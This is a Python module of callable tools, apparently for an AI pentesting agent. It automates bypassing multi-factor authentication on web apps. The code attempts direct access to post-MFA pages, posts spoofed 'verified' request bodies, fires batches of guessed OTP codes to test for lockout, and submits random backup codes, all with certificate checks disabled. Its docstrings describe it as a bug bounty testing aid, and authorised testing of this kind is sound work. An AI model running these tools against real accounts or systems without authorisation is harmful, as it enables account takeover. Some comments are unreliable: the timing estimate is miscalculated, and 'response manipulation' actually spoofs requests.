"""
MFA / 2FA Bypass Suite
Tests common 2FA/MFA bypass techniques encountered in real bug bounty programs.

Techniques:
- Response manipulation (modify JSON to bypass MFA check)
- TOTP code reuse (same code accepted twice)
- Backup code enumeration
- MFA step skipping (directly request post-MFA endpoint)
- OTP rate limit bruteforce
- Account recovery flow bypass
"""

import json
import time
import requests
from src.sdk.core import function_tool


def _req(method, url, hdrs, body=None, params=None, timeout=10):
    try:
        return requests.request(method, url, headers=hdrs, json=body,
                                params=params, verify=False, timeout=timeout)
    except Exception:
        return None


@function_tool()
def mfa_response_manipulation(
    mfa_verify_url: str,
    post_mfa_url: str,
    headers: str = "{}",
    mfa_payload: str = '{"otp_code": "000000"}'
):
    """
    Test if MFA can be bypassed by manipulating the verification response.
    Observes what a failed MFA response looks like, then tries to access
    the post-MFA protected resource directly.

    Args:
        mfa_verify_url: URL to submit MFA code (e.g. /auth/mfa/verify)
        post_mfa_url: URL that should only be accessible after successful MFA
        headers: JSON string of session headers (pre-MFA session token)
        mfa_payload: JSON body for MFA verification attempt
    """
    try:
        hdrs = json.loads(headers)
    except Exception:
        hdrs = {}
    try:
        payload_body = json.loads(mfa_payload)
    except Exception:
        payload_body = {"otp_code": "000000"}

    results = [f"[MFA-BYPASS] Testing MFA bypass at: {mfa_verify_url}"]

    # Step 1: See failure response
    fail_resp = _req("POST", mfa_verify_url, hdrs, body=payload_body)
    if fail_resp:
        results.append(f"[BASELINE] MFA failure: HTTP {fail_resp.status_code}")
        results.append(f"  Response: {fail_resp.text[:200]}")
    else:
        results.append("[ERROR] Could not reach MFA endpoint")

    # Step 2: Try accessing post-MFA resource directly without completing MFA
    results.append(f"\n[STEP 2] Attempting direct access to post-MFA URL: {post_mfa_url}")
    direct_resp = _req("GET", post_mfa_url, hdrs)
    if direct_resp:
        status = direct_resp.status_code
        if status == 200 and len(direct_resp.text) > 100:
            results.append(f"⚠️  MFA STEP SKIP: Post-MFA URL accessible without completing MFA! HTTP {status}")
            results.append(f"  Response: {direct_resp.text[:200]}")
        elif status in (401, 403):
            results.append(f"[BLOCKED] Direct access denied: HTTP {status}")
        elif status == 302:
            results.append(f"[REDIRECT] Redirected: {direct_resp.headers.get('Location', 'unknown')}")
        else:
            results.append(f"[INFO] HTTP {status}: {direct_resp.text[:100]}")

    # Step 3: Try with success-spoofed body
    results.append("\n[STEP 3] Testing response body manipulation bypass")
    spoofed_bodies = [
        {"success": True, "mfa_verified": True, "otp_code": "000000"},
        {"status": "ok", "verified": True},
        {"result": "success"},
        {"authenticated": True, "mfa_passed": True}
    ]

    for body in spoofed_bodies:
        resp = _req("POST", mfa_verify_url, hdrs, body=body)
        if resp and resp.status_code == 200:
            if any(kw in resp.text.lower() for kw in ["token", "session", "dashboard", "welcome"]):
                results.append(f"⚠️  RESPONSE MANIP: Spoofed body accepted! Body: {body}")
                results.append(f"  Response: {resp.text[:200]}")
            else:
                results.append(f"[OK] Spoofed body {list(body.keys())[0]}: HTTP 200 but no session tokens")
        elif resp:
            results.append(f"[OK] Spoofed body {list(body.keys())[0]}: HTTP {resp.status_code}")

    return "\n".join(results)


@function_tool()
def otp_bruteforce_probe(
    otp_verify_url: str,
    headers: str = "{}",
    otp_field: str = "otp_code",
    digits: int = 6,
    sample_size: int = 20,
    delay_ms: int = 200
):
    """
    Test OTP/TOTP endpoint for rate limiting and bruteforce protection.
    Sends multiple invalid codes to detect lack of lockout or throttling.

    Args:
        otp_verify_url: URL to submit OTP (e.g. /auth/verify-otp)
        headers: JSON string of session headers
        otp_field: JSON field name for OTP code
        digits: Number of digits in OTP (usually 6)
        sample_size: How many codes to try before concluding
        delay_ms: Milliseconds between attempts
    """
    try:
        hdrs = json.loads(headers)
    except Exception:
        hdrs = {}

    results = [f"[OTP-BRUTEFORCE] Probing rate limit: {otp_verify_url}"]
    results.append(f"[INFO] Sending {sample_size} invalid OTPs with {delay_ms}ms delay")

    codes_tried = 0
    locked_out = False
    rate_limited = False

    for i in range(sample_size):
        # Generate codes in groups to maximize coverage
        code = str(i * 100).zfill(digits)  # spaced out codes
        body = {otp_field: code}

        resp = _req("POST", otp_verify_url, hdrs, body=body)
        if resp is None:
            results.append(f"[ERROR] No response at attempt {i+1}")
            break

        status = resp.status_code
        codes_tried += 1

        if status == 429:
            rate_limited = True
            results.append(f"[RATE-LIMITED] After {codes_tried} attempts: HTTP 429")
            break
        elif status == 403 and "lock" in resp.text.lower():
            locked_out = True
            results.append(f"[LOCKED] Account locked after {codes_tried} attempts")
            break
        elif status in (200, 401, 400):
            if i < 3 or i % 5 == 0:
                results.append(f"[ATTEMPT {i+1}] code={code} → HTTP {status}")
        else:
            results.append(f"[ATTEMPT {i+1}] code={code} → HTTP {status}")

        time.sleep(delay_ms / 1000)

    results.append(f"\n{'='*50}")
    if not rate_limited and not locked_out:
        results.append(f"⚠️  NO RATE LIMITING: Sent {codes_tried} OTP attempts with no lockout")
        results.append("Impact: OTP can be bruteforced (6-digit = 1M combinations)")
        results.append(f"At {sample_size} req/s → ~{1000000 // sample_size}s to exhaust all codes")
    elif rate_limited:
        results.append(f"[PROTECTED] Rate limiting triggered after {codes_tried} attempts")
    elif locked_out:
        results.append(f"[PROTECTED] Account lockout after {codes_tried} attempts")

    return "\n".join(results)


@function_tool()
def mfa_backup_code_probe(
    backup_code_url: str,
    headers: str = "{}",
    code_format: str = "8digit",
    attempts: int = 30
):
    """
    Test backup code endpoint for enumeration and rate limiting.

    Args:
        backup_code_url: URL to submit backup codes (e.g. /auth/backup-code)
        headers: JSON string of session headers
        code_format: Format hint ('8digit', 'alphanumeric', 'xxxx-xxxx')
        attempts: Number of codes to attempt
    """
    import random as rnd
    try:
        hdrs = json.loads(headers)
    except Exception:
        hdrs = {}

    results = [f"[BACKUP-CODE] Probing backup code endpoint: {backup_code_url}"]

    def gen_code(fmt):
        if fmt == "8digit":
            return str(rnd.randint(10000000, 99999999))
        elif fmt == "alphanumeric":
            import string
            return "".join(rnd.choices(string.ascii_lowercase + string.digits, k=8))
        elif fmt == "xxxx-xxxx":
            return f"{rnd.randint(1000,9999)}-{rnd.randint(1000,9999)}"
        return str(rnd.randint(0, 99999999)).zfill(8)

    blocked = 0
    accepted = 0

    for i in range(attempts):
        code = gen_code(code_format)
        body = {"backup_code": code, "code": code, "recovery_code": code}
        resp = _req("POST", backup_code_url, hdrs, body=body)
        status = resp.status_code if resp else "ERR"

        if status == 429:
            blocked += 1
            results.append(f"[RATE-LIMITED] After {i+1} attempts")
            break
        elif status == 200 and resp and any(kw in resp.text.lower() for kw in ["success", "logged", "token"]):
            accepted += 1
            results.append(f"⚠️  BACKUP CODE ACCEPTED: code={code}")
        elif i < 3 or i % 10 == 0:
            results.append(f"[ATTEMPT {i+1}] code={code} → HTTP {status}")

        time.sleep(0.1)

    results.append(f"\n{'='*50}")
    if accepted > 0:
        results.append(f"⚠️  {accepted} backup codes accepted — collision or predictability")
    elif blocked == 0:
        results.append(f"⚠️  No rate limiting on backup code endpoint after {attempts} attempts")
    else:
        results.append("Backup code endpoint appears properly protected")

    return "\n".join(results)
